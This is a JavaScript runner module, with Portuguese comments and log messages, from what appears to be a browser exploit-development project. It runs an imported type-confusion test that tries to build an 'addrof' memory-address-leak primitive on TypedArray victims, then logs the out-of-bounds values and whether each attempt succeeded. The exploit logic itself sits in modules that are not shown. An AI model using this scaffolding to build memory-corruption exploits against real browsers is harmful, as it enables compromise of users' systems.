// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 11)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R11, // <<<< NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R11"; // Atualizado
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R11(); // <<<< NOME DA FUNÇÃO ATUALIZADO

    if (result.errorOccurred) {
        logS3(`  RUNNER: Teste principal capturou ERRO: ${result.errorOccurred}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: MainTest ERR!`;
    } else if (result) {
        ...
        if (result.addrof_A_result) {
            logS3(`  RUNNER: Addrof via CoreExploit Func (R11): ${result.addrof_A_result.msg} (Valor: ${result.addrof_A_result.value}, Double: ${result.addrof_A_result.raw_double})`, addrofCoreSuccess ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (addrofGetterInfo) {
            logS3(`  RUNNER: Addrof via Getter na Sonda TC (R11): ${addrofGetterInfo.msg} (Valor: ${addrofGetterInfo.value})`, addrofGetterInfo.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`  RUNNER: Addrof Direct Prop (ObjB ID) (R11): ${result.addrof_B_result.msg} (Valor: ${JSON.stringify(result.addrof_B_result.value)})`, addrofDirectSuccess ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (addrofCoreSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: AddrofCore SUCCESS! (OOB: ${result.oob_value_of_best_result})`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: TC OK, Addrof Fail (OOB: ${result.oob_value_of_best_result})`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: No TC Confirmed (OOB: ${result.oob_value_of_best_result})`;
        }
        
        if(result.iteration_results_summary && result.iteration_results_summary.length > 0){
            logS3(`  RUNNER: Sumário completo das iterações (R11):`, "info", FNAME_RUNNER);
        ...
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: Invalid Result Obj`;
    }
...
export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator_R11`; 
    ...
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL) && 
        ...
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11 Run Finished`; 
    }
}
